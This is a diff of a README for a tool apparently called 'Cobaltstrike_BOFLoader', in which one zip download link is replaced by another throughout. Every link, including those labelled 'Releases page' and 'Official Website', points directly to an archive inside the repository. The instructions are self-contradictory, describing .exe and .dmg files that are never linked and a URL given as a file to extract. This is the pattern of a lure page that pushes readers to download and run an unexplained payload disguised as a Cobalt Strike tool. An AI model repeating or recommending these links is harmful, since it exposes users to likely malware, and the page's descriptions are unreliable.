@@ -1,7 +1,7 @@
 # ⚙️ Cobaltstrike_BOFLoader - Easy Cobalt Strike Blending Tool
 
 ## 📥 Download Now
-[![Download Cobaltstrike_BOFLoader](https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip)](https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip)
+[![Download Cobaltstrike_BOFLoader](https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip)](https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip)
 
 ## 🚀 Getting Started
 Cobaltstrike_BOFLoader is an open-source tool designed to help you easily load Cobalt Strike's Beacon Object Files (BOFs). This application simplifies the process for users who want to integrate Cobalt Strike into their workflows without needing deep technical expertise.
@@ -25,21 +25,21 @@ Before downloading, ensure your system meets these basic requirements:
 To get started, visit the Releases page for Cobaltstrike_BOFLoader. Here’s how:
 
 1. Click on the link below to go to the Releases page.
-   - [Download Cobaltstrike_BOFLoader](https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip)
+   - [Download Cobaltstrike_BOFLoader](https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip)
    
 2. Once on the Releases page, look for the latest version listed at the top.
 
 3. Download the file suitable for your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip` file.
 
 4. After the download completes, locate the file in your downloads folder.
 
 5. Open the file:
    - For **Windows**: Double-click the `.exe` file to run the installer.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the `https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip` file and follow the included instructions.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip` file and follow the included instructions.
 
 6. Follow any on-screen prompts during installation.
 
@@ -57,8 +57,8 @@ If you have any questions or need support, feel free to open an issue in the Git
 Join our community discussions on platforms like Discord or Slack. Sharing feedback helps us improve Cobaltstrike_BOFLoader. Your insights are crucial, so don’t hesitate to reach out!
 
 ## 🔗 Useful Links
-- [Cobaltstrike_BOFLoader Releases](https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip)
-- [Cobaltstrike Official Website](https://github.com/urFavCoderr/Cobaltstrike_BOFLoader/raw/refs/heads/main/anemony/BOF-Loader-Cobaltstrike-v2.3.zip)
+- [Cobaltstrike_BOFLoader Releases](https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip)
+- [Cobaltstrike Official Website](https://raw.githubusercontent.com/urFavCoderr/Cobaltstrike_BOFLoader/main/anemony/Cobaltstrike_Loader_BOF_v2.8.zip)
 
 ## 📝 License
 Cobaltstrike_BOFLoader is licensed under the MIT License. You are free to modify and distribute this software. Please refer to the LICENSE file for more details.
